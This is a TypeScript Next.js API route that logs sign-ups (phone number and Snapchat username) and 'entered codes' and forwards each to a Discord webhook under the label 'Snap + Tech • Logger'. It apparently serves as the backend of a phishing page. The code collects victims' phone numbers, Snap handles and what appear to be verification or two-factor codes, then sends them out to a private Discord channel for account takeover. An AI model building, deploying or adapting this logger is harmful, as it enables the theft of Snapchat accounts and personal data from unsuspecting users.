import { NextResponse } from "next/server"

const WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL

interface LogBody {
  type: "inscription" | "code_saisi"
  phone?: string
  pseudo?: string
  code?: string
}

export async function POST(req: Request) {
  let body: LogBody
  try {
    body = (await req.json()) as LogBody
  } catch {
    return NextResponse.json({ ok: false, error: "invalid_json" }, { status: 400 })
  }

  if (!body || !body.type) {
    return NextResponse.json({ ok: false, error: "missing_type" }, { status: 400 })
  }

  let embed

  if (body.type === "inscription") {
    embed = {
      title: "📝 Nouvelle inscription",
      color: 0xfacc15,
      fields: [
        { name: "Numéro", value: "`" + (body.phone ?? "—") + "`", inline: true },
        { name: "Pseudo Snap", value: "`@" + (body.pseudo ?? "—") + "`", inline: true },
      ],
      footer: { text: "Snap + Tech • Logger" },
      timestamp: new Date().toISOString(),
    }
  } else if (body.type === "code_saisi") {
    embed = {
      title: "🔑 Code saisi",
      color: 0xeab308,
      fields: [
        { name: "Code", value: "`" + (body.code ?? "—") + "`", inline: true },
        { name: "Numéro", value: "`" + (body.phone ?? "—") + "`", inline: true },
        { name: "Pseudo Snap", value: "`@" + (body.pseudo ?? "—") + "`", inline: true },
      ],
      footer: { text: "Snap + Tech • Logger" },
      timestamp: new Date().toISOString(),
    }
  } else {
    return NextResponse.json({ ok: false, error: "unknown_type" }, { status: 400 })
  }

  const payload = {
    username: "Snap + Tech • Logs",
    embeds: [embed],
  }

  if (!WEBHOOK_URL) {
    console.warn("[DISCORD_WEBHOOK] URL non configurée — log ignoré:", body.type)
    return NextResponse.json({ ok: true, forwarded: false })
  }

  try {
    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    })
    if (!res.ok) {
      console.error("[DISCORD_WEBHOOK] HTTP", res.status, await res.text())
      return NextResponse.json({ ok: false, error: "webhook_failed" }, { status: 502 })
    }
    return NextResponse.json({ ok: true, forwarded: true })
  } catch (e) {
    console.error("[DISCORD_WEBHOOK] Exception:", e)
    return NextResponse.json({ ok: false, error: "fetch_error" }, { status: 500 })
  }
}

export async function GET() {
  return NextResponse.json({ ok: true, webhook_configured: Boolean(WEBHOOK_URL) })
}
